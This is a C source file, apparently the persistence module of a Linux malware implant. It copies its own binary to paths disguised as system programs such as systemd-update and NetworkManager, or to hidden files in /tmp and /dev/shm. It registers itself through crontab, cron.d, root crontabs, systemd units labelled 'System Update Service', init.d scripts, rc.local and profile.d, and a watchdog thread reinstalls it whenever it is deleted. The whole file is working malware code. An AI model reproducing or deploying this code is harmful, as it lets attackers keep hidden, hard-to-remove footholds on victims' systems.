#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <limits.h>
#include <signal.h>
#include <dirent.h>

#include "headers/persist.h"

static const char *persist_paths[] = {
    "/usr/lib/systemd/systemd-update",
    "/usr/lib/systemd/systemd-timesyncd",
    "/lib/systemd/systemd-update",
    "/usr/bin/NetworkManager",
    "/usr/sbin/netconsole",
    NULL
};

static char g_dst[PATH_MAX] = {0};

static int copy_self(const char *dst) {
    char self[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self, sizeof(self)-1);
    if (len <= 0) return -1;
    self[len] = '\0';

    int sfd = open(self, O_RDONLY);
    if (sfd < 0) return -1;
    int dfd = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0755);
    if (dfd < 0) { close(sfd); return -1; }

    char buf[8192];
    ssize_t n;
    while ((n = read(sfd, buf, sizeof(buf))) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(dfd, buf + off, n - off);
            if (w <= 0) break;
            off += w;
        }
    }

    close(sfd); close(dfd);
    return 0;
}

static int file_contains(const char *file, const char *needle) {
    FILE *f = fopen(file, "r");
    if (!f) return 0;
    char buf[4096];
    size_t n = fread(buf, 1, sizeof(buf)-1, f);
    fclose(f);
    buf[n] = 0;
    return strstr(buf, needle) != NULL;
}

static void install_cron(const char *path) {
    char line[512];
    snprintf(line, sizeof(line), "@reboot %s\n*/10 * * * * %s\n", path, path);

    if (!file_contains("/etc/crontab", path)) {
        FILE *f = fopen("/etc/crontab", "a");
        if (f) { fprintf(f, "%s", line); fclose(f); }
    }

    char cron_path[256];
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    snprintf(cron_path, sizeof(cron_path), "/etc/cron.d/%s", base);
    FILE *f = fopen(cron_path, "w");
    if (f) {
        fprintf(f, "SHELL=/bin/sh\nPATH=/usr/bin:/bin:/usr/local/bin\n%s", line);
        fclose(f);
        chmod(cron_path, 0644);
    }

    const char *cron_dirs[] = {
        "/etc/cron.hourly", "/var/spool/cron/crontabs",
        "/var/spool/cron", NULL
    };
    for (int i = 0; cron_dirs[i]; i++) {
        char p[256];
        snprintf(p, sizeof(p), "%s/root", cron_dirs[i]);
        if (!file_contains(p, path)) {
            f = fopen(p, "a");
            if (f) { fprintf(f, "@reboot %s\n", path); fclose(f); chmod(p, 0600); }
        }
    }
}

static void install_systemd(const char *path) {
    const char *name = strrchr(path, '/');
    if (!name) name = path; else name++;

    char service[512];
    snprintf(service, sizeof(service), "/etc/systemd/system/%s.service", name);
    FILE *f = fopen(service, "w");
    if (f) {
        fprintf(f, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n", path);
        fclose(f);
        chmod(service, 0644);

        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "systemctl enable %s.service 2>/dev/null", name);
        system(cmd);
        snprintf(cmd, sizeof(cmd), "systemctl start %s.service 2>/dev/null", name);
        system(cmd);
    }

    snprintf(service, sizeof(service), "/lib/systemd/system/%s.service", name);
    f = fopen(service, "w");
    if (f) {
        fprintf(f, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n", path);
        fclose(f);
    }
}

static void install_initd(const char *path) {
    const char *name = strrchr(path, '/');
    if (!name) name = path; else name++;

    char init_path[256];
    snprintf(init_path, sizeof(init_path), "/etc/init.d/%s", name);
    FILE *f = fopen(init_path, "w");
    if (!f) return;
    fprintf(f, "#!/bin/sh\n# %s\n### BEGIN INIT INFO\n# Provides: %s\n# Required-Start: $network\n# Required-Stop:\n# Default-Start: 2 3 4 5\n# Default-Stop:\n# Description: System service\n### END INIT INFO\n\ncase \"$1\" in\n  start)\n    start-stop-daemon -S -b -x %s\n    ;;\n  stop)\n    start-stop-daemon -K -x %s\n    ;;\n  restart)\n    $0 stop; $0 start\n    ;;\n  *)\n    echo \"Usage: $0 {start|stop|restart}\"\n    exit 1\n    ;;\nesac\nexit 0\n", path, name, path, path);
    fclose(f);
    chmod(init_path, 0755);

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "update-rc.d %s defaults 2>/dev/null", name);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "rc-update add %s 2>/dev/null", name);
    system(cmd);
}

static void install_rclocal(const char *path) {
    if (!file_contains("/etc/rc.local", path)) {
        FILE *f = fopen("/etc/rc.local", "a");
        if (f) { fprintf(f, "\n%s &\n", path); fclose(f); chmod("/etc/rc.local", 0755); }
    }

    if (!file_contains("/etc/rc.d/rc.local", path)) {
        FILE *f = fopen("/etc/rc.d/rc.local", "a");
        if (f) { fprintf(f, "\n%s &\n", path); fclose(f); chmod("/etc/rc.d/rc.local", 0755); }
    }
}

static void install_profiled(const char *path) {
    FILE *f = fopen("/etc/profile.d/systemd.sh", "w");
    if (!f) return;
    fprintf(f, "[ -x %s ] && nohup %s >/dev/null 2>&1 &\n", path, path);
    fclose(f);
    chmod("/etc/profile.d/systemd.sh", 0755);
}

static void install_all(const char *path) {
    install_cron(path);
    install_systemd(path);
    install_initd(path);
    install_rclocal(path);
    install_profiled(path);
}

static void *persist_watchdog(void *arg) {
    (void)arg;
    while (1) {
        sleep(60);

        if (!g_dst[0]) continue;

        struct stat st;
        if (stat(g_dst, &st) != 0 || st.st_size == 0) {
            copy_self(g_dst);
            install_all(g_dst);
        }
    }
    return NULL;
}

void persist(void) {
    char self[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self, sizeof(self)-1);
    if (len <= 0) return;
    self[len] = '\0';

    for (int i = 0; persist_paths[i]; i++) {
        const char *dst = persist_paths[i];

        if (strcmp(self, dst) == 0) {
            strncpy(g_dst, dst, sizeof(g_dst)-1);
            goto done;
        }

        struct stat st;
        if (stat(dst, &st) == 0 && st.st_size > 0)
            continue;

        if (copy_self(dst) == 0) {
            strncpy(g_dst, dst, sizeof(g_dst)-1);
            install_all(dst);
            goto done;
        }
    }

    {
        const char *fallbacks[] = {"/tmp/.systemd", "/dev/shm/.systemd", "/var/tmp/.systemd", NULL};
        for (int i = 0; fallbacks[i]; i++) {
            if (copy_self(fallbacks[i]) == 0) {
                strncpy(g_dst, fallbacks[i], sizeof(g_dst)-1);
                install_all(fallbacks[i]);
                goto done;
            }
        }
    }

done:
    if (g_dst[0]) {
        pthread_t t;
        pthread_create(&t, NULL, persist_watchdog, NULL);
        pthread_detach(t);
    }
}
